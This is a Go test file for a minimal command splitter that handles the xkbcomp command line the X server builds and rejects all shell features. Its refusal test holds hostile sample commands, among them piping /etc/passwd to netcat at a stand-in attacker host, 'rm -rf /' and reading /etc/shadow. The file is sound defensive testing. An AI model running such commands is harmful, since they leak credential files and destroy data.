package minishell

import (
	"reflect"
	"strings"
	"testing"
)

func TestSplitHandlesWhatTheXServerActuallyWrites(t *testing.T) {
	// This is the command the X server builds for xkbcomp, quotes and all.
	command := `"xkbcomp" -w 1 -R/usr/share/X11/xkb -xkm - "/var/lib/xkb/server-0.xkm"`
	words, err := split(command)
	if err != nil {
		t.Fatalf("split: %s", err)
	}
	expected := []string{"xkbcomp", "-w", "1", "-R/usr/share/X11/xkb", "-xkm", "-", "/var/lib/xkb/server-0.xkm"}
	if !reflect.DeepEqual(words, expected) {
		t.Errorf("split gave %q, want %q", words, expected)
	}
}

func TestSplitHandlesQuotingAndEscapes(t *testing.T) {
	cases := map[string][]string{
		`one two`:            {"one", "two"},
		`  one   two  `:      {"one", "two"},
		`'a b' c`:            {"a b", "c"},
		`"a b" c`:            {"a b", "c"},
		`a\ b`:               {"a b"},
		`"a\"b"`:             {`a"b`},
		`/usr/bin/x -f=/a/b`: {"/usr/bin/x", "-f=/a/b"},
		``:                   nil,
	}
	for command, expected := range cases {
		words, err := split(command)
		if err != nil {
			t.Errorf("split(%q): %s", command, err)
			continue
		}
		if !reflect.DeepEqual(words, expected) {
			t.Errorf("split(%q) gave %q, want %q", command, words, expected)
		}
	}
}

func TestSplitRefusesEveryShellFeature(t *testing.T) {
	// The whole value of this file is that it is not a shell. A command using
	// a shell feature must be refused, not approximated: approximating it
	// would run something other than what was written.
	for _, command := range []string{
		`cat /etc/passwd | nc attacker 1234`,
		`rm -rf / &`,
		`a; b`,
		`echo hello > /etc/cue/cue.yaml`,
		`cat < /etc/shadow`,
		`echo $(id)`,
		"echo `id`",
		`echo ${HOME}`,
		`ls *.yaml`,
		`(cd /; ls)`,
		`echo a && echo b`,
	} {
		if _, err := split(command); err == nil {
			t.Errorf("split(%q) was accepted; this must not behave like a shell", command)
		}
	}
}

func TestSplitReportsUnclosedQuotes(t *testing.T) {
	for _, command := range []string{`'unclosed`, `"unclosed`} {
		if _, err := split(command); err == nil {
			t.Errorf("split(%q) was accepted", command)
		}
	}
}

func TestOnlyTheDashCFormIsAccepted(t *testing.T) {
	command, err := commandFrom([]string{"sh", "-c", "xkbcomp -"})
	if err != nil {
		t.Fatalf("commandFrom: %s", err)
	}
	if command != "xkbcomp -" {
		t.Errorf("the command is %q", command)
	}

	for _, arguments := range [][]string{
		{"sh"},
		{"sh", "/etc/script.sh"},
		{"sh", "-c"},
	} {
		if _, err := commandFrom(arguments); err == nil {
			t.Errorf("%q was accepted", arguments)
		}
	}
}

func TestIsInvokedAsShell(t *testing.T) {
	for _, name := range []string{"sh", "/bin/sh", "/usr/bin/sh"} {
		if !IsInvokedAsShell(name) {
			t.Errorf("%q should be recognised as the shell", name)
		}
	}
	for _, name := range []string{"cue", "/usr/local/bin/cue", "bash", "/bin/bash"} {
		if IsInvokedAsShell(name) {
			t.Errorf("%q should not be recognised as the shell", name)
		}
	}
}

func TestRunReportsAMissingProgramTheWayAShellDoes(t *testing.T) {
	var output strings.Builder
	status := Run([]string{"sh", "-c", "/nonexistent/program"}, &output)
	if status != 127 {
		t.Errorf("the exit status is %d, want 127", status)
	}
	if !strings.Contains(output.String(), "not found") {
		t.Errorf("the message is %q", output.String())
	}
}
